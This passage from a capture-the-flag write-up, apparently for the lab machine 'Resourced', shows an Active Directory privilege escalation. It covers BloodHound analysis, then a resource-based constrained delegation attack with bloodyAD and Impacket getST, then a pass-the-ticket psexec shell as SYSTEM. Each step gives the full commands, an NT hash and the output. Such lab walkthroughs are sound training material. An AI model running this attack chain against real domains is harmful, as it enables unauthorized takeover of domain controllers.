LDAP        192.168.101.175 389    RESOURCEDC       Compressing output into /home/kali/.nxc/logs/RESOURCEDC_192.168.101.175_2026-11-12_132822_bloodhound.zip
 
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ cp /home/kali/.nxc/logs/RESOURCEDC_192.168.101.175_2026-11-12_132822_bloodhound.zip bloodhound.zip
```

And start BloodHound/Neo4j.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ bloodhound-start
[sudo] password for kali: 
Starting neo4j
Neo4j is not running.
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:190414). It is available at http://localhost:7474
There may be a short delay until the server is ready.
...............................................................................................................

┏━(Message from Kali developers)
┃ 
┃ Please wait for the bloodhound service to start
┃ ....................
┃ [*] Web UI: http://127.0.0.1:8080
┃ [i] You might need to refresh your browser once it opens
┃ 
┃  Default credentials:
┃    user: admin
┃    password: admin
┃ 
┗━
```

### BloodHound Data Analysis

We then login and delete our previous collected data.  
Select `Administration`, then `Database Management` and enable all check-boxes.

![BloodHound Delete Previous Data](Images/BloodHound_Delete_Prev_Data.png)

Next, we load our new data from `Quick Upload`.

After the loading is complete, we select `Explore` and search for the users have have credentials for and Add them to Owned:

- `V.Ventz`
- `L.Livingstone`

We can then show them with the following cypher-query:

`MATCH (n) WHERE n:Tag_Owned RETURN n`

![Resourced BloodHound Starting Point](Images/Resourced_BloodHound_Starting_Point.png)

Then we run the `Shortest paths from Owned object` query under `Cypher` and `Saved Queries`:

![Resourced BloodHound Analysis 1](Images/Resourced_BloodHound_Analysis_1.png)

Ah, we have [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all) permission on the domain controller computer object. So we can perform a [Resource-based Constrained Delegation (RBCD) attack](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/) and escalate our privileges.

### Perform RBCD attack

First we create a fake computer account.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ bloodyad -u L.Livingstone  -p :19a3a7550ce8c505c2d46b5e39d6f808 -d resourced.local --host $TARGET_IP add computer fakecomp 'FakePassword@123'
[+] fakecomp$ created
```

Then we rewrite the DC’s `msDS-AllowedToActOnBehalfOfOtherIdentity` properties to allow the account to act on behalf of the other identity.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ bloodyad -u L.Livingstone -p :19a3a7550ce8c505c2d46b5e39d6f808 -d resourced.local --host $TARGET_IP add rbcd 'RESOURCEDC$' 'fakecomp$'
[!] No security descriptor has been returned, a new one will be created
[+] fakecomp$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+nt://resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808@192.168.101.175/?serverip=192.168.101.175' 'HOST/RESOURCEDC$@resourced.local' 'Administrator@resourced.local'

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ bloodyad -u L.Livingstone -p :19a3a7550ce8c505c2d46b5e39d6f808 -d resourced.local --host $TARGET_IP get object 'RESOURCEDC$'

distinguishedName: CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 2026-11-12 12:27:48.215810+00:00
badPwdCount: 1
cn: RESOURCEDC
codePage: 0
countryCode: 0
dNSHostName: ResourceDC.resourced.local
dSCorePropagationData: 2021-10-01 11:15:17+00:00
instanceType: 4
isCriticalSystemObject: True
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 2026-11-12 12:27:11.825170+00:00
lastLogonTimestamp: 2026-11-12 12:26:55.622024+00:00
localPolicyFlags: 0
logonCount: 26
msDFSR-ComputerReferenceBL: CN=RESOURCEDC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=resourced,DC=local
msDS-AllowedToActOnBehalfOfOtherIdentity: O:S-1-5-32-544D:(A;OICI;CR;;;S-1-5-21-537427935-490066102-1511301751-4101)
msDS-GenerationId: 049tDOPrl3o=
msDS-SupportedEncryptionTypes: 28
<---snip--->
```

Next, we generate a service ticket for [CIFS](https://en.wikipedia.org/wiki/Server_Message_Block#CIFS).

We use the fake machine account to request a Kerberos Service Ticket for a privileged user (e.g., Administrator) using Service for User to Self (S4U2Self). Then, we escalate the ticket using Service for User to Proxy (S4U2Proxy) to obtain access to DC$.

We use Impacket's `getST.py` script to obtain a Service Ticket (ST) for impersonation.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ impacket-getST resourced.local/'fakecomp$':FakePassword@123 -spn cifs/RESOURCEDC.resourced.local -impersonate administrator -dc-ip $TARGET_IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache
```

The ticket is saved in the mentioned ccache-file.

### Get an Administrator shell

With the Kerberos ticket we can use pass-the-ticket to get an administrator shell.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$  export KRB5CCNAME=administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ impacket-psexec resourced.local/administrator@RESOURCEDC.resourced.local -k -no-pass -dc-ip $TARGET_IP 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on RESOURCEDC.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file VKRPKeYH.exe
[*] Opening SVCManager on RESOURCEDC.resourced.local.....
[*] Creating service CHAJ on RESOURCEDC.resourced.local.....
[*] Starting service CHAJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

### Get the root flag

Finally, we can get the root flag.

```bash
C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
7<REDACTED>a

C:\Windows\system32> 
```

For additional information, please see the references below.

## References

- [BloodHound - Docs](https://bloodhound.specterops.io/home)
- [BloodHound - GitHub](https://github.com/SpecterOps/BloodHound)
- [BloodHound - Homepage](https://specterops.io/open-source-tools/bloodhound-community-edition/)
- [BloodHound - Kali Tools](https://www.kali.org/tools/bloodhound/)
- [BloodHound - Query Library](https://queries.specterops.io/)
- [bloodyAD - GitHub](https://github.com/CravateRouge/bloodyAD)
- [bloodyad - Kali Tools](https://www.kali.org/tools/bloodyad/)
- [bloodyad - Wiki](https://github.com/CravateRouge/bloodyAD/wiki)
- [cut - Linux manual page](https://man7.org/linux/man-pages/man1/cut.1.html)
- [Domain Escalation: Resource-based Constrained Delegation](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)
- [Domain Name System - Wikipedia](https://en.wikipedia.org/wiki/Domain_Name_System)
- [Evil-WinRM - GitHub](https://github.com/Hackplayers/evil-winrm)
- [Evil-WinRM - Kali Tools](https://www.kali.org/tools/evil-winrm/)
- [export - Linux manual page](https://www.man7.org/linux/man-pages/man1/export.1p.html)
- [GenericAll Permission - BloodHound Docs](https://bloodhound.specterops.io/resources/edges/generic-all)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [Impacket - GitHub](https://github.com/fortra/impacket)
- [Impacket - Homepage](https://www.coresecurity.com/core-labs/impacket)
- [Impacket - Kali Tools](https://www.kali.org/tools/impacket/)
- [Impacket-scripts - Kali Tools](https://www.kali.org/tools/impacket-scripts/)
- [Kerberos (protocol) - Wikipedia](https://en.wikipedia.org/wiki/Kerberos_(protocol))
- [Lightweight Directory Access Protocol - Wikipedia](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol)
- [Microsoft RPC - Wikipedia](https://en.wikipedia.org/wiki/Microsoft_RPC)
- [NetBIOS over TCP/IP - Wikipedia](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP)
- [NetExec - GitHub](https://github.com/Pennyw0rth/NetExec)
- [NetExec - Kali Tools](https://www.kali.org/tools/netexec/)
- [NetExec - Wiki](https://www.netexec.wiki)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Remote Desktop Protocol - Wikipedia](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
- [smbclient - Kali Tools](https://www.kali.org/tools/samba/#smbclient)
- [smbclient - Linux manual page](https://linux.die.net/man/1/smbclient)
- [Smbmap - GitHub](https://github.com/ShawnDEvans/smbmap)
- [Smbmap - Kali Tools](https://www.kali.org/tools/smbmap/)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [tail - Linux manual page](https://man7.org/linux/man-pages/man1/tail.1.html)
- [type - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type)
- [vi - Linux manual page](https://man7.org/linux/man-pages/man1/vi.1p.html)
- [What Is the Global Catalog? - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc728188(v=ws.10))
- [whoami - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
- [Windows Remote Management - Wikipedia](https://en.wikipedia.org/wiki/Windows_Remote_Management)
